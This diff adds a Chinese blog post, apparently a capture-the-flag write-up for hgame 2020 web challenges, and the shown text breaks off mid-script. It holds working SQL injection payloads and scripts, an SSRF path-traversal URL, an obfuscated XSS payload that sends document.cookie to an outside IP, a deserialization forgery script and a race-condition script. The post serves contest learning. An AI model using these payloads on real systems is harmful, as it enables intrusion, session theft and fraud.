@@ -66,6 +66,1668 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-2020hgame" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/02/07/2020hgame/" class="article-date">
+  <time class="dt-published" datetime="2020-02-07T12:20:03.284Z" itemprop="datePublished">2020-02-07</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/02/07/2020hgame/">2020hgame</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="2020hgame"><a href="#2020hgame" class="headerlink" title="2020hgame"></a>2020hgame</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h3><blockquote>
+<p>不过有大茄子告诉我的<strong>版本管理工具</strong>以及 GitHub，我改起来也挺方便的。 </p>
+</blockquote>
+<p>根据提示下载.git</p>
+<pre><code class="bash">$ git remote -v
+#查看git</code></pre>
+<p>查看提交历史拿到flag</p>
+<h3 id="街头霸王"><a href="#街头霸王" class="headerlink" title="街头霸王"></a>街头霸王</h3><p>考察对http的了解</p>
+<pre><code>GET / HTTP/1.1
+Host: kyaru.hgame.n3ko.co
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Cosmos Brower
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+referer: https://vidar.club/ 
+x-forwarded-for: 127.0.0.1
+If-Unmodified-Since: Fri, 02 Jan 2077 00:00:00 GMT
+Connection: close
+
+</code></pre><h3 id="code-world"><a href="#code-world" class="headerlink" title="code world"></a>code world</h3><p>burp拦截</p>
+<p>修改GET为post</p>
+<h3 id="鸡你太美"><a href="#鸡你太美" class="headerlink" title="鸡你太美"></a>鸡你太美</h3><p>拦截ajax请求,修改分数</p>
+<h3 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h3><pre><code class="php">&lt;?php
+include &quot;config.php&quot;;
+session_start();
+
+//Only for debug
+if (DEBUG_MODE){
+    if(isset($_GET[&#39;debug&#39;])) {
+        $debug = $_GET[&#39;debug&#39;];
+        if (!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $debug)) {
+            die(&quot;args error!&quot;);
+        }
+        eval(&quot;var_dump($$debug);&quot;);
+    }
+}
+
+if(isset($_SESSION[&#39;username&#39;])) {
+    header(&quot;Location: admin.php&quot;);
+    exit();
+}
+else {
+    if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) {
+        if ($admin_password == md5($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;] === $admin_username){
+            $_SESSION[&#39;username&#39;] = $_POST[&#39;username&#39;];
+            header(&quot;Location: admin.php&quot;);
+            exit();
+        }
+        else {
+            echo &quot;ç¨æ·åæå¯ç éè¯¯&quot;;
+        }
+    }
+}
+?&gt;
+</code></pre>
+<p>adminpassword: 0e114902927253523756713132279690 </p>
+<p>密码使用==来进行md5校验,找个0e开头的密码即可绕过(QNKCDZO)</p>
+<p>adminusername: Cosmos! </p>
+<p>index.php</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+session_start();
+
+if(isset($_SESSION[&#39;username&#39;])) {
+    header(&quot;Location: admin.php&quot;);
+    exit();
+}
+
+$action = @$_GET[&#39;action&#39;];
+$filter = &quot;/config|etc|flag/i&quot;;
+
+if (isset($_GET[&#39;action&#39;]) &amp;&amp; !empty($_GET[&#39;action&#39;])) {
+    if(preg_match($filter, $_GET[&#39;action&#39;])) {
+        echo &quot;Hacker get out!&quot;;
+        exit();
+    }
+        include $action;
+}
+elseif(!isset($_GET[&#39;action&#39;]) || empty($_GET[&#39;action&#39;])) {
+    header(&quot;Location: ?action=login.php&quot;);
+    exit();
+}</code></pre>
+<p>admin.php</p>
+<pre><code class="php">&lt;?php
+include &quot;config.php&quot;;
+session_start();
+if(!isset($_SESSION[&#39;username&#39;])) {
+    header(&#39;Location: index.php&#39;);
+    exit();
+}
+
+function insert_img() {
+    if (isset($_POST[&#39;img_url&#39;])) {
+        $img_url = @$_POST[&#39;img_url&#39;];
+        $url_array = parse_url($img_url);
+        if (@$url_array[&#39;host&#39;] !== &quot;localhost&quot; &amp;&amp; $url_array[&#39;host&#39;] !== &quot;timgsa.baidu.com&quot;) {
+            return false;
+        }   
+        $c = curl_init();
+        curl_setopt($c, CURLOPT_URL, $img_url);
+        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+        $res = curl_exec($c);
+        curl_close($c);
+        $avatar = base64_encode($res);
+
+        if(filter_var($img_url, FILTER_VALIDATE_URL)) {
+            return $avatar;
+        }
+    }
+    else {
+        return base64_encode(file_get_contents(&quot;static/logo.png&quot;));
+    }
+}
+?&gt;
+
+&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static/error.jpg&quot;)); ?&gt;&#39;&gt;
+</code></pre>
+<p>file%3A%2F%2Flocalhost%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag</p>
+<p>hgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}</p>
+<h3 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h3><p>单引号闭合</p>
+<p>过滤:select</p>
+<p>黑名单:空格</p>
+<pre><code>0&#39;/**/union/**/select/**/group_concat(schema_name)/**/FROM/**/information_schema.schemata#
+information_schema,easysql
+0&#39;/**/union/**/select/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/TABLE_SCHEMA=database();#
+f1aggggggggggggg,messages#
+GROUP_CONCAT(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name/**/=/**/&#39;f1aggggggggggggg&#39;
+fl4444444g
+
+hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}</code></pre><h3 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h3><p>php</p>
+<pre><code class="php">&lt;?php
+
+// function encrypt($str){
+//     $result = &#39;&#39;;
+//     for($i = 0; $i &lt; strlen($str); $i++){
+//         $result .= chr(ord($str[$i]) + 1);
+//     }
+//     return $result;
+// }
+function encrypt($str)
+{
+    $result = &#39;&#39;;
+    for($i = 0; $i &lt; strlen($str); $i++){
+        $result .= chr(ord($str[$i]) - 1);
+    }
+    return $result;
+}
+$newcmd=&#39;$_POST[\&#39;token\&#39;]&#39;;
+$cmd=substr($_POST[&#39;cmd&#39;],0,strlen($_POST[&#39;cmd&#39;])-1);
+preg_match(&quot;/^.*\(/U&quot;,$cmd,$arr);
+$cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);
+
+while($cmd!==&#39;$_SERVER[\&#39;token\&#39;]&#39;)
+{
+    $arr=array();
+    preg_match(&quot;/^.*\(/U&quot;,$cmd,$arr);
+    $newcmd=$arr[0].$newcmd.&quot;)&quot;;    
+    $cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);
+
+}
+
+$cmd=(str_replace(&quot;base64_encode&quot;,&quot;base64_decode&quot;,$newcmd));    
+
+
+$dec=eval(&quot;echo &quot;.$cmd.&quot;;&quot;);
+?&gt;</code></pre>
+<p>python </p>
+<pre><code class="python">import requests
+def get_flag():
+    enccmd=requests.get(&quot;http://4211e914b2.php.hgame.n3ko.co/mycode&quot;).text[159:]
+    enccmd=enccmd[:len(enccmd)-75]
+    html=requests.get(&quot;http://4211e914b2.php.hgame.n3ko.co/&quot;).text[626:]
+    enc=html[:html.find(&quot;&lt;br&gt;&quot;)]
+    data={&quot;token&quot;:enc,&quot;cmd&quot;:enccmd}
+    dec=requests.post(&quot;http://127.0.0.1/&quot;,data=data).text
+    data={&quot;token&quot;:dec}
+    print(requests.post(&quot;http://4211e914b2.php.hgame.n3ko.co/&quot;,data=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}).text[626:])
+
+get_flag()</code></pre>
+<h3 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h3><pre><code class="html">&lt;svg/onload=&quot;[][&#39;\155\141\160&#39;][&#39;\143\157\156\163\164\162\165\143\164\157\162&#39;](&#39;\144\157\143\165\155\145\156\164\56\154\157\143\141\164\151\157\156\75\47\150\164\164\160\72\57\57\63\71\56\61\60\70\56\61\66\64\56\62\61\71\72\66\60\60\60\65\57\77\47\53\144\157\143\165\155\145\156\164\56\143\157\157\153\151\145&#39;)()&quot; aa=</code></pre>
+<p>输入会变成大写</p>
+<h3 id="序列之争-Ordinal-Scale"><a href="#序列之争-Ordinal-Scale" class="headerlink" title="序列之争 - Ordinal Scale"></a>序列之争 - Ordinal Scale</h3><p>这一题要让<code>$_SESSION[&#39;rank&#39;]===1</code>时,有flag</p>
+<p>而默认的逻辑是没法实现的</p>
+<pre><code class="php">        if($this-&gt;rank &lt;= 2){
+                $this-&gt;rank = 2;
+            }</code></pre>
+<p>阅读代码发现反序列化点:</p>
+<p><code>Monster</code>的<code>__construct</code>方法</p>
+<pre><code class="php">public function __construct($key){
+        $this-&gt;encryptKey = $key;
+        if(!isset($_COOKIE[&#39;monster&#39;])){
+            $this-&gt;Set();
+            return;
+        }
+
+        $monsterData = base64_decode($_COOKIE[&#39;monster&#39;]);
+        if(strlen($monsterData) &gt; 32){
+            $sign = substr($monsterData, -32);
+            $monsterData = substr($monsterData, 0, strlen($monsterData) - 32);
+            if(md5($monsterData . $this-&gt;encryptKey) === $sign){
+                $this-&gt;monsterData = unserialize($monsterData);
+            }else{
+                session_start();
+                session_destroy();
+                setcookie(&#39;monster&#39;, &#39;&#39;);
+                header(&#39;Location: index.php&#39;);
+                exit;
+            }
+        }
+
+        $this-&gt;Set();     
+    }</code></pre>
+<p>但是要知道<code>$key</code>才能反序列化</p>
+<p>在<code>Game</code>的<code>__construct</code>方法中看到格式化字符串漏洞泄露<code>$key</code></p>
+<pre><code class="php">
+class Game
+{   
+    private $encryptKey = &#39;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#39;;
+    public $welcomeMsg = &#39;%s, Welcome to Ordinal Scale!&#39;;
+
+    private $sign = &#39;&#39;;
+    public $rank;
+//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL
+    public function __construct($playerName){
+        $_SESSION[&#39;player&#39;] = $playerName;
+        if(!isset($_SESSION[&#39;exp&#39;])){
+            $_SESSION[&#39;exp&#39;] = 0;
+        }
+        $data = [$playerName, $this-&gt;encryptKey];
+        $this-&gt;init($data);//set sign
+        $this-&gt;monster = new Monster($this-&gt;sign);
+        $this-&gt;rank = new Rank();
+    }
+
+    private function init($data){
+        foreach($data as $key =&gt; $value){
+            $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);
+            $this-&gt;sign .= md5($this-&gt;sign . $value);
+        }
+    }
+}</code></pre>
+<p>可以反序列化后,我们发现<code>Fight</code>的<code>__destruct</code>方法可以修改<code>$_SESSION[&#39;rank&#39;]</code></p>
+<pre><code class="php">public function __destruct(){
+        // 确保程序是跑在服务器上的！
+        $this-&gt;serverKey = $_SERVER[&#39;key&#39;];
+        if($this-&gt;key === $this-&gt;serverKey){
+            $_SESSION[&#39;rank&#39;] = $this-&gt;rank;
+        }else{
+            // 非正常访问
+            session_start();
+            session_destroy();
+            setcookie(&#39;monster&#39;, &#39;&#39;);
+            header(&#39;Location: index.php&#39;);
+            exit;
+        }
+    }</code></pre>
+<p>但是还有<code>$this-&gt;key === $this-&gt;serverKey</code>阻挠这我们</p>
+<p>如果我们能获得或修改<code>$_SERVER[&#39;key&#39;]</code>,便可以拿到flag了</p>
+<p>php反序列化有个特性,反序列化时,若对象没有某个值,便会恢复成该对象对应的类的默认值</p>
+<p>如:</p>
+<pre><code class="php">&lt;?php
+class test{
+    public $my_static = &#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;;
+    public function __destruct()
+    {
+        echo $this-&gt;my_static;
+    }
+
+}
+class tesa{
+
+}
+$a=str_replace(&quot;tesa&quot;,&quot;test&quot;,serialize(new tesa()));
+unserialize($a);
+
+
+结果:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code></pre>
+<p>于是构造</p>
+<pre><code class="php">&lt;?php
+class Game
+{
+    private $encryptKey = &#39;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#39;;
+    public $welcomeMsg = &#39;%s, Welcome to Ordinal Scale!&#39;;
+
+    public $sign = &#39;&#39;;
+    public $rank;
+//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL
+    public function __construct($playerName){
+        $_SESSION[&#39;player&#39;] = $playerName;
+        if(!isset($_SESSION[&#39;exp&#39;])){
+            $_SESSION[&#39;exp&#39;] = 0;
+        }
+        $data = [$playerName, $this-&gt;encryptKey];
+        $this-&gt;init($data);//set sign
+    }
+
+    private function init($data){
+        foreach($data as $key =&gt; $value){
+            $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);
+            $this-&gt;sign .= md5($this-&gt;sign . $value);
+        }
+    }
+}
+class Rank
+{
+    private $rank;
+//    private $serverKey;     // 服务器的 Key
+//    private $key;
+
+    public function __construct()
+    {
+        $this-&gt;rank=1;
+    }
+
+    public function __destruct(){
+
+    }
+}
+$s=new Rank();
+//$s=array(&#39;name&#39;=&gt;&#39;蔡建斌&#39;,&#39;no&#39;=&gt;999999999999999999);
+$a=new Game($_GET[&#39;name&#39;]);
+$sign = md5(serialize($s) . $a-&gt;sign);
+print( base64_encode(serialize($s) . $sign));
+?&gt;
+</code></pre>
+<h3 id="二发入魂"><a href="#二发入魂" class="headerlink" title="二发入魂"></a>二发入魂</h3><p>刚看到这题时是有点懵的,网页的图片是妙蛙种子,是想说交种子上去,但我没看懂/////</p>
+<p>前一段时间爆出来的mt_srand逆向刚好可以用到</p>
+<p> <a href="https://github.com/ambionics/mt_rand-reverse" target="_blank" rel="noopener">https://github.com/ambionics/mt_rand-reverse</a> </p>
+<pre><code class="php">import requests
+import os
+
+burp0_url = &quot;https://twoshot.hgame.n3ko.co:443/random.php?times=230&quot;
+burp0_cookies = {&quot;PHPSESSID&quot;: &quot;quh0vrim4vv8p4mnro1migluh3&quot;}
+burp0_headers = {&quot;Connection&quot;: &quot;close&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Referer&quot;: &quot;https://twoshot.hgame.n3ko.co/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;}
+result=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text
+
+a=eval(result)
+p = os.popen(&quot;python reverse_mt_rand.py %d %d 0 0&quot; % (a[0],a[227]) )
+x=p.read().strip()
+
+burp0_url = &quot;https://twoshot.hgame.n3ko.co:443/verify.php&quot;
+burp0_cookies = {&quot;PHPSESSID&quot;: &quot;quh0vrim4vv8p4mnro1migluh3&quot;}
+burp0_headers = {&quot;Connection&quot;: &quot;close&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;https://twoshot.hgame.n3ko.co&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Referer&quot;: &quot;https://twoshot.hgame.n3ko.co/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;}
+burp0_data = {&quot;ans&quot;: x}
+print(burp0_data)
+result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text
+print(result)
+</code></pre>
+<h3 id="Cosmos的二手市场"><a href="#Cosmos的二手市场" class="headerlink" title="Cosmos的二手市场"></a>Cosmos的二手市场</h3><h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>弱密码登陆别人账号,直接抄作业</p>
+<p>admin,123456</p>
+<h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>条件竞争</p>
+<p>在一次偶然的爆破中我发现,商品的数量多了,于是便猜测有条件竞争漏洞</p>
+<p>我来模拟以下造成条件竞争漏洞的原因</p>
+<p>首先猜测以下solve和buy方法的流程</p>
+<pre><code class="php">function solve()
+{
+    #1. $num=从数据库中查找要用户持有的卖出商品的个数
+    #2. 如果数量足够,则进行下一步,否则返回并报错
+    #3. 在数据库中增加用户账户里的钱
+    #4. 在数据库中减少用户拥有该商品的数量
+}</code></pre>
+<p>假设web服务器在相差一个步骤的时间时收到两个请求,此时fork出两个进程a,b,设此时商品数量为1,两个请求要卖出的数量也都为1</p>
+<ol>
+<li>a 执行完步骤1(<code>$num=1</code>);b刚要开始执行步骤1</li>
+<li>a执行完步骤二;b执行完步骤一(<code>$num=1</code>)</li>
+<li>a执行步骤三,用户账户里的钱增加了;b执行完步骤二,b进程也满足条件</li>
+<li>a执行步骤四,此时数据库中商品的数量为0,b执行完步骤三,用户账户里的钱增加了</li>
+<li>a进程结束;b进程试图减少数据库中商品的数量,但是数量最小为0,操作失败</li>
+<li>b进程结束</li>
+</ol>
+<p>于是我们可以看到最终结果是,用户用1单位的商品卖出了两个单位商品的价钱(1个商品被卖了两次)</p>
+<p>为啥会这样,这是同时操作一个数据导致的bug,这也是为啥计算机里经常出现锁这个名称的原因,给数据上锁,避免两个进程同时操作一个数据,导致bug</p>
+<p>刷钱脚本</p>
+<pre><code class="python">from multiprocessing import Pool
+import requests
+def buy(num,loop=3):
+
+    for i in range(loop):
+        burp0_url = &quot;http://121.36.88.65:9999/API/?method=buy&quot;
+        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;gd44lbha3t9ltc1cgng5c755ni&quot;}
+        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://121.36.88.65:9999&quot;, &quot;Referer&quot;: &quot;http://121.36.88.65:9999/market.html&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
+        burp0_data = {&quot;code&quot;: &quot;800001&quot;, &quot;amount&quot;: num}
+        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text
+        if &quot;success&quot; in result:
+            print(&quot;successfully buy %d items&quot; % num)
+
+
+def solve(num,loop=3):
+
+    for i in range(loop):
+        burp0_url = &quot;http://121.36.88.65:9999/API/?method=solve&quot;
+        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;gd44lbha3t9ltc1cgng5c755ni&quot;}
+        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://121.36.88.65:9999&quot;, &quot;Referer&quot;: &quot;http://121.36.88.65:9999/market.html&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
+        burp0_data = {&quot;code&quot;: &quot;800001&quot;, &quot;amount&quot;: num}
+        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text
+        if &quot;success&quot; in result:
+            print(&quot;successfully solve %d items&quot; % num)
+
+if __name__==&#39;__main__&#39;:
+    i=0
+    while True:
+        p = Pool(100)
+        num=500
+        for i in range(100):
+            p.apply_async(buy, args=(num,))
+        print(&#39;Waiting for all buy subprocesses done...&#39;)
+        p.close()
+        p.join()
+        print(&#39;All subprocesses done.&#39;)
+
+        p = Pool(100)
+
+        for i in range(100):
+            p.apply_async(solve, args=(num,))
+        print(&#39;Waiting for all solve subprocesses done...&#39;)
+        p.close()
+        p.join()
+        print(&#39;All subprocesses done.&#39;)
+</code></pre>
+<h3 id="留言板"><a href="#留言板" class="headerlink" title="留言板"></a>留言板</h3><p>注册登陆的黑名单</p>
+<pre><code class="python">allow: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, 
+&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;_&#39;, &#39;\n&#39;]
+disable: [&#39;!&#39;, &#39;&quot;&#39;, &#39;#&#39;, &#39;$&#39;, &#39;%&#39;, &#39;&amp;&#39;, &quot;&#39;&quot;, &#39;(&#39;, &#39;)&#39;, &#39;*&#39;, &#39;+&#39;, &#39;,&#39;, &#39;-&#39;, &#39;.&#39;, &#39;/&#39;, &#39;:&#39;, &#39;;&#39;, &#39;&lt;&#39;, &#39;=&#39;, &#39;&gt;&#39;, &#39;?&#39;, &#39;@&#39;, &#39;[&#39;, &#39;\\&#39;, &#39;]&#39;, &#39;^&#39;, &#39;`&#39;, &#39;{&#39;, &#39;|&#39;, &#39;}&#39;, &#39;~&#39;, &#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\x0b&#39;, &#39;\x0c&#39;]</code></pre>
+<p>一个个检测输入点发现,delete方法存在sql注入</p>
+<p>注入脚本</p>
+<pre><code class="python">import requests
+from bs4 import BeautifulSoup
+def send():
+
+    burp0_url = &quot;http://139.199.182.61:19999/index.php?method=send&quot;
+    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}
+    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
+    burp0_data = {&quot;message&quot;: &quot;aaa&quot;}
+    res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
+    if res.status_code==200:
+        return 1
+    else :
+        return 0
+
+def get_id():
+
+
+    burp0_url = &quot;http://139.199.182.61:19999/index.php?message=aaa&quot;
+    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}
+    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
+    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
+    html = res.text
+    try :
+        soup = BeautifulSoup(html,&#39;html.parser&#39;) #把网页解析为BeautifulSoup对象
+        url=soup.find(&quot;span&quot;,class_=&quot;message&quot;).find(&quot;a&quot;)[&#39;href&#39;]
+    except:
+        return False
+    return url.replace(&quot;index.php?method=delete&amp;delete_id=&quot;,&quot;&quot;)
+
+
+def check(mesid):
+    burp0_url = &quot;http://139.199.182.61:19999/index.php?message=aaa&quot;
+    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}
+    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
+    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
+    url=&quot;index.php?method=delete&amp;delete_id=&quot;+str(mesid)
+    if url in res.text:
+        return True
+    return False
+#index.php?method=delete&amp;delete_id=6594
+
+def delete(mesid):
+    burp0_url = &quot;http://139.199.182.61:19999/index.php&quot;
+    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}
+    burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
+    requests.get(burp0_url, params={&quot;method&quot;:&quot;delete&quot;,&quot;delete_id&quot;:mesid},headers=burp0_headers, cookies=burp0_cookies)
+
+
+def sql_inj(sql):
+    mesid=get_id()
+    delete(str(mesid)+&quot; and (&quot;+sql+&quot;) #&quot;)
+    if not check(mesid):
+        print(&quot;%s success&quot; % sql)
+        send()
+        return True
